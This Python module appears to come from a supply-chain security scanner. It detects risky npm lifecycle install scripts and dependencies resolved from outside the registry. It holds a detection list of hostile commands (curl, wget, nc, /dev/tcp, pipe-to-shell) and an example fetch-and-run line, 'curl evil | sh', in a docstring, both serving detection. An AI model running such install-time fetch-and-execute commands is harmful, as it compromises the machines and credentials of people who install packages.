"""Manifest inspection: lifecycle scripts and dependency sources.

This detector covers the single most common supply-chain attack: a lifecycle
script added to a package so that arbitrary code runs during installation, as
the developer, before any other control applies.

Two decisions define it.

**The lifecycle check is an allowlist, not a blocklist.** The attack is *adding
a script*, so enumerating known-bad commands is permanently one step behind
whoever writes the next one. Instead, the set of permitted lifecycle entries is
declared and anything else is a finding, including a changed value for a
permitted key.

**The dependency-source check is about mechanism, not intent.** A dependency
resolved from a git URL, an archive URL or a filesystem path may be entirely
legitimate. The point is that none of the ecosystem's own protections apply to
it: no lockfile integrity hash, no advisory matching, no release-age cooldown.
The finding says the safety net is absent, not that something is wrong.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING

from cordon_scanner.core.models import (
    Capability,
    Category,
    Confidence,
    Evidence,
    EvidenceKind,
    Explanation,
    Finding,
    Location,
    RedactionMode,
    RiskScore,
    Severity,
)
from cordon_scanner.core.redact import Redactor
from cordon_scanner.core.scoring import ScoringContext
from cordon_scanner.detect.base import BaseDetector, DetectorRequirements, FileUnit, ScanContext
from cordon_scanner.detect.catalogue import DeclaredRule
from cordon_scanner.ecosystems.registry import EcosystemRegistry

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.detect.base import Unit
    from cordon_scanner.ecosystems.base import Manifest

# Commands that in a lifecycle script are, on their own, sufficient evidence.
# Every entry either fetches and runs remote content, reads credentials, or
# opens a shell. None has a legitimate purpose in code that executes silently
# during `install`.
HOSTILE_IN_LIFECYCLE = (
    ("curl", Capability.EGRESS),
    ("wget", Capability.EGRESS),
    ("nc ", Capability.EGRESS),
    ("Invoke-WebRequest", Capability.EGRESS),
    ("base64", Capability.DECODE),
    ("eval", Capability.EXECUTE),
    ("node -e", Capability.EXECUTE),
    ("python -c", Capability.EXECUTE),
    ("bash -c", Capability.SPAWN),
    ("sh -c", Capability.SPAWN),
    ("/dev/tcp", Capability.EGRESS),
    ("chmod +x", Capability.PERSIST),
)

PIPE_TO_SHELL = ("| sh", "|sh", "| bash", "|bash", "| python", "|python")

INSTALL_TIME_HOOKS = frozenset(
    {"preinstall", "install", "postinstall", "prepare", "prepublish", "prepack"}
)
"""Lifecycle names that run without anybody asking for them.

`npm install` fires these. A developer running `npm run build` has chosen to run
something; a developer running `npm install` has not, and that is the whole
difference. `postinstall` in particular runs on every machine that ever installs
the package, transitively, as the user."""

SAFE_LIFECYCLE_PREFIXES = (
    "node-gyp",
    "prebuild-install",
    "node-pre-gyp",
    "prebuildify",
    "tsc",
    "npm run build",
    "yarn build",
    "pnpm build",
    "husky install",
    "husky",
    "patch-package",
    "opencollective",
    "is-ci",
    "cmake-js",
    "neon build",
    "electron-builder install-app-deps",
)
"""Commands a lifecycle script may run without raising anything.

An allowlist, because the attack is *adding a script*, not putting a particular
word in one. The check used to be a blocklist of hostile substrings, and its own
docstring said otherwise -- so `postinstall: node ./scripts/setup.js`, the single
most common npm attack shape, produced no finding at all. That is the failure
this project names as unacceptable: a control that reads as protective while
doing nothing.

Short on purpose. Native compilation and a TypeScript build are the honest
reasons to run at install time; everything else is a script somebody should look
at, which is what the finding says. An entry here is a decision that a command
needs no review, so the list stays small enough to read.
"""


#: Directories whose manifests belong to somebody else.
#:
#: The distinction this rule was missing, and the reason it was calibrated for one
#: case and only ever fired on the other. An install script in a DEPENDENCY'S
#: manifest is code the project did not write, arriving through a lockfile,
#: running automatically on install: that is the npm attack shape, and it earns
#: high severity. An install script in the project's OWN root manifest is code
#: somebody here wrote, in the file every pull request touches, usually running a
#: script a few directories away in the same repository.
#:
#: Both were reported at high, which is backwards in practice, because
#: `node_modules` is pruned by default -- so in ordinary use the only manifests
#: this rule ever sees are first-party ones. It reported six high-severity
#: findings across three repositories for `"preinstall": "node
#: scripts/security/only-pnpm.mjs"`, a script whose entire purpose is to refuse an
#: install from the wrong package manager, and fifty-five in an Office add-in.
VENDORED_DIRECTORIES = (
    "node_modules",
    "bower_components",
    "vendor",
    "site-packages",
    "dist-packages",
    ".venv",
    "venv",
    "Pods",
    "Carthage",
    ".cargo",
    ".gradle",
    ".m2",
    ".nuget",
    "gems",
)


def _is_vendored(path: str) -> bool:
    """Whether this manifest belongs to an installed dependency rather than here."""
    segments = path.replace("\\", "/").split("/")
    return any(segment in VENDORED_DIRECTORIES for segment in segments)


def _is_first_party(path: str, ctx: ScanContext) -> bool:
    """Whether this manifest is the scanned project's own.

    Two conditions, and both took a corpus failure to get right.

    The manifest must not be under a dependency directory, and the scan target must
    BE a git repository root.

    Vendoring alone is not enough, because the case that matters most has no vendor
    directory in it: a published package, an sdist, a downloaded tarball. There the
    hostile manifest IS the root manifest, and three malicious samples in this
    project's own corpus are exactly that shape -- `acme-telemetry`, built to look
    like a real npm compromise, went from high to low on the path test alone.

    `is_git` was the obvious second condition and is the wrong one. It answers
    "is there a repository above this", so scanning
    `corpus/malicious/acme-telemetry` from inside a checkout answers yes, and every
    downloaded package or extracted archive examined anywhere inside any repository
    reads as first-party. The question is whether the thing handed to the scanner is
    the working tree itself, which is what `scanned_repository_root` records.

    What the downgrade gives up is nothing, and the same corpus sample proves it:
    `acme-telemetry` declares three CRITICAL findings besides the install-script
    one, because the script the manifest points at is read by the content detectors
    on its own merits. The manifest finding is a pointer at a file. The file is
    where the answer is.
    """
    if _is_vendored(path):
        return False
    return bool(ctx.repository is not None and ctx.repository.scanned_repository_root)


def _targets_in_tree(command: str, known: frozenset[str]) -> tuple[str, ...]:
    """Files in this repository that the command runs.

    A first-party install script that runs a file in the same repository is a
    different proposition from one that runs something opaque. The file is tracked,
    was reviewed when it landed, and -- the part that matters most here -- is being
    scanned by every content detector in this same run. Reporting the manifest at
    high severity for pointing at a file the scanner has already read and cleared
    says nothing the reader can act on.

    `ctx.install_hook_paths` is the engine's own resolution of every install hook
    to the in-tree files it reaches, so this asks a question that has already been
    answered rather than parsing shell a second time and disagreeing about it.
    """
    if not known:
        return ()
    tokens = {
        token.strip("\"'`()").lstrip("./")
        for token in re.split(r"[\s;|&]+", command)
        if token.strip()
    }
    return tuple(sorted(path for path in known if path in tokens or path.lstrip("./") in tokens))


def _is_safe_lifecycle(command: str) -> bool:
    """Whether a lifecycle command is a recognised build step.

    Compared against the whole command after stripping shell chaining, so
    `node-gyp rebuild && curl evil | sh` is not waved through by its first
    clause -- which is how an allowlist that matched a prefix of the raw string
    would have been defeated in one move.
    """
    parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
    if not parts:
        return False
    return all(
        any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
        for part in parts
    )


class ManifestDetector(BaseDetector):
    """Inspects dependency manifests."""

    id = "manifest"
    version = "0.1.0"
    categories = frozenset(
        {Category.MALICIOUS, Category.SUSPICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    @staticmethod
    def declared_rules() -> tuple[DeclaredRule, ...]:
        return (
            DeclaredRule(
                id="MALWARE.INSTALL.FETCH_EXEC.001",
                title="Install script fetches and executes remote content",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                category=Category.MALICIOUS,
                detector=ManifestDetector.id,
                remediation="Treat the host as compromised. Do not install this package.",
            ),
            DeclaredRule(
                id="SUSPECT.INSTALL.SCRIPT.001",
                title="Package declares an install-time lifecycle script",
                severity=Severity.LOW,
                confidence=Confidence.HIGH,
                category=Category.SUSPICIOUS,
                detector=ManifestDetector.id,
                remediation="Read the script. Install hooks run before any review or test.",
            ),
        )

    def applicable(self, ctx: ScanContext) -> bool:
        return True

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()

        ecosystem_id = EcosystemRegistry.manifest_ecosystem(unit.path)
        if ecosystem_id is None:
            return ()

        ecosystem = EcosystemRegistry.get(ecosystem_id)
        if ecosystem is None:
            return ()

        manifest = ecosystem.parse_manifest(unit.content)

        if manifest.parse_error:
            # A manifest that could not be read is a manifest whose contents
            # were not checked. Reporting it keeps that from resembling a pass.
            return [
                self._operational(
                    unit.path,
                    f"Could not parse this {ecosystem_id} manifest, so its "
                    f"lifecycle scripts and dependency sources were not "
                    f"checked: {manifest.parse_error}",
                )
            ]

        findings: list[Finding] = []
        findings.extend(self._lifecycle_findings(manifest, unit, ctx))
        findings.extend(self._source_findings(manifest, unit, ctx))
        return findings

    # -- Lifecycle scripts -----------------------------------------------

    def _lifecycle_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        for hook in manifest.hooks:
            command = hook.command
            if not command:
                continue

            capabilities: list[Capability] = []
            reasons: list[str] = []

            for needle, capability in HOSTILE_IN_LIFECYCLE:
                if needle in command:
                    capabilities.append(capability)
                    reasons.append(f"invokes {needle.strip()!r}")

            piped = any(marker in command for marker in PIPE_TO_SHELL)
            if piped:
                capabilities.append(Capability.SPAWN)
                reasons.append("pipes fetched content directly into an interpreter")

            install_time = hook.name in INSTALL_TIME_HOOKS
            if not capabilities:
                if not install_time or _is_safe_lifecycle(command):
                    continue
                # An install-time script that is not a recognised build step.
                # Reported for existing, rather than for containing a word from
                # a list: `node ./scripts/setup.js` matched no hostile substring
                # and produced nothing, while being the shape most npm
                # compromises actually take. What the referenced file does is a
                # separate question the file detectors answer -- and cannot
                # answer at all if nothing points at it.
                first_party = _is_first_party(unit.path, ctx)
                vendored = not first_party
                in_tree = _targets_in_tree(command, ctx.install_hook_paths) if first_party else ()
                yield self._finding(
                    rule_id="SUSPECT.INSTALL.SCRIPT.001",
                    category=Category.SUSPICIOUS,
                    # Graded by whose manifest it is and what the command reaches.
                    # A dependency's install script is the attack; the project's
                    # own, pointing at a file in the same repository that this scan
                    # has already read, is a fact worth stating once.
                    severity=(
                        Severity.HIGH if vendored else Severity.LOW if in_tree else Severity.MEDIUM
                    ),
                    confidence=Confidence.MEDIUM,
                    title=(
                        "Install script in code this project did not write"
                        if vendored
                        else "Install script runs an unrecognised command"
                    ),
                    message=(
                        (
                            f"The {hook.name!r} script runs automatically during install, "
                            f"before any test, review or container boundary applies, and "
                            f"runs {command!r}. This manifest is not the scanned "
                            f"project's own - it is a dependency's, or this is a "
                            f"published package rather than a working tree - so nobody "
                            f"here wrote it and no review here covered it."
                        )
                        if vendored
                        else (
                            f"The {hook.name!r} script runs automatically during install "
                            f"and runs {command!r}, which reaches "
                            f"{', '.join(in_tree)} in this repository. That file is "
                            f"tracked, was reviewed when it landed, and has been scanned "
                            f"by every other detector in this run, so this is reported to "
                            f"be recorded rather than because anything is wrong with it. "
                            f"What remains true is that it runs before any test does."
                        )
                        if in_tree
                        else (
                            f"The {hook.name!r} script runs automatically during install, "
                            f"before any test, review or container boundary applies, and "
                            f"runs {command!r} -- which is not a recognised build step "
                            f"and does not resolve to a file in this repository, so "
                            f"nothing here can say what it does."
                        )
                    ),
                    remediation=(
                        "Read the script. If it is a build step, move it behind an "
                        "explicit command a developer chooses to run; if it must run at "
                        "install time, suppress this finding with a justification."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=[],
                    reasons=["runs at install time and is not a recognised build step"],
                )
                continue

            fetch_and_run = Capability.EGRESS in capabilities and (
                piped or Capability.SPAWN in capabilities or Capability.EXECUTE in capabilities
            )

            if fetch_and_run:
                yield self._finding(
                    rule_id="MALWARE.INSTALL.FETCH_EXEC.001",
                    category=Category.MALICIOUS,
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    title="Install script fetches and executes remote content",
                    message=(
                        f"The {hook.name!r} script downloads content and runs it. This "
                        f"executes automatically on every install, as the user, before "
                        f"any test, review or container boundary applies. What runs is "
                        f"whatever the remote host serves at that moment, so it is not "
                        f"pinned by the lockfile and not captured by review."
                    ),
                    remediation=(
                        "Treat the host as compromised. Do not install this package. "
                        "Rotate credentials reachable from the affected machine, "
                        "starting with registry publish tokens."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=capabilities,
                    reasons=reasons,
                )
            else:
                yield self._finding(
                    rule_id="SUSPECT.INSTALL.SCRIPT.001",
                    category=Category.SUSPICIOUS,
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    title="Install script performs unexpected operations",
                    message=(
                        f"The {hook.name!r} script runs automatically during install and "
                        f"performs operations a build step does not need. Install-time "
                        f"code runs as the user with their full environment."
                    ),
                    remediation=(
                        "Move the work into an explicit build command that a developer "
                        "chooses to run, and review what the script does."
                    ),
                    unit=unit,
                    ctx=ctx,
                    detail=f"{hook.name}: {command}",
                    capabilities=capabilities,
                    reasons=reasons,
                )

    # -- Dependency sources ----------------------------------------------

    def _source_findings(
        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext
    ) -> Iterable[Finding]:
        for declared in manifest.dependencies:
            if not declared.is_non_registry:
                continue
            yield self._finding(
                rule_id="POLICY.DEPENDENCY.SOURCE.001",
                category=Category.POLICY,
                severity=Severity.MEDIUM,
                confidence=Confidence.CONFIRMED,
                title="Dependency resolved from outside the registry",
                message=(
                    f"{declared.name!r} is declared as {declared.spec!r}, which does not "
                    f"resolve from the {manifest.ecosystem} registry. Lockfile integrity "
                    f"hashes, advisory matching and any release-age delay all apply to "
                    f"registry packages and none of them apply here. The dependency may "
                    f"be entirely legitimate; the safety net is simply absent."
                ),
                remediation=(
                    "Publish the package to a registry the organisation controls, or "
                    "vendor it into the repository where it is reviewed like any other "
                    "code."
                ),
                unit=unit,
                ctx=ctx,
                detail=f"{declared.field_name}.{declared.name} = {declared.spec}",
                capabilities=(),
                reasons=[f"declared in {declared.field_name}"],
            )

    # -- Construction ----------------------------------------------------

    def _finding(
        self,
        *,
        rule_id: str,
        category: Category,
        severity: Severity,
        confidence: Confidence,
        title: str,
        message: str,
        remediation: str,
        unit: FileUnit,
        ctx: ScanContext,
        detail: str,
        capabilities: list[Capability] | tuple[Capability, ...],
        reasons: list[str],
    ) -> Finding:
        line = self._line_of(unit, detail)

        risk = ctx.scorer.score(
            severity,
            confidence,
            ScoringContext(
                # A lifecycle script is install-time by definition; the manifest
                # need not be listed as a hook for that to be true.
                in_install_hook=True,
                capabilities=frozenset(capabilities),
            ),
        )

        return Finding(
            rule_id=rule_id,
            category=category,
            severity=severity,
            confidence=confidence,
            message=message,
            location=Location(path=unit.path, line=line, project=unit.project),
            evidence=Evidence(
                kind=EvidenceKind.METADATA,
                match_hash=Evidence.hash_bytes(detail.encode("utf-8")),
                redaction=RedactionMode.MASKED,
                # Masked because a lifecycle command can embed a token, and a
                # finding must never be the thing that copies one into a log.
                snippet=Redactor.mask(detail[:200]),
            ),
            remediation=remediation,
            explanation=Explanation(
                summary=title,
                matched_rule=rule_id,
                escalations=tuple(reasons),
            ),
            risk=risk,
            detector=self.id,
            capabilities=tuple(dict.fromkeys(capabilities)),
        )

    @staticmethod
    def _line_of(unit: FileUnit, detail: str) -> int | None:
        """Find the line a manifest entry sits on.

        Best effort by design. The parsers work on parsed structures, which
        carry no positions, so the key is located in the raw text afterwards.
        A missing line number is acceptable; a wrong file is not.
        """
        key = detail.split(":", 1)[0].split(" =", 1)[0].strip()
        if not key:
            return None
        needle = f'"{key}"'.encode()
        index = unit.content.raw.find(needle)
        if index == -1:
            index = unit.content.raw.find(key.encode())
        return unit.content.line_of(index) if index != -1 else None

    def _operational(self, path: str, message: str) -> Finding:
        return Finding(
            rule_id="OPERATIONAL.MANIFEST.UNPARSED",
            category=Category.OPERATIONAL,
            # MEDIUM, not INFO. A manifest is the file that decides what runs at
            # install time, so being unable to read one is a coverage hole
            # rather than a note: every lifecycle check, every declared
            # dependency and every install-hook path for this package is
            # unavailable, and the report should not read like a package that
            # was examined and found to declare nothing.
            severity=Severity.MEDIUM,
            confidence=Confidence.CONFIRMED,
            message=message,
            location=Location(path=path),
            evidence=Evidence(
                kind=EvidenceKind.METADATA,
                match_hash=Evidence.hash_bytes(path.encode()),
                redaction=RedactionMode.NONE,
            ),
            remediation="Fix the syntax error so the manifest can be checked.",
            explanation=Explanation(
                summary="A manifest that cannot be parsed is a manifest that was not checked.",
                matched_rule="OPERATIONAL.MANIFEST.UNPARSED",
            ),
            risk=RiskScore(value=0, base=0, confidence_multiplier=1.0),
            detector=self.id,
        )


__all__ = ["ManifestDetector"]
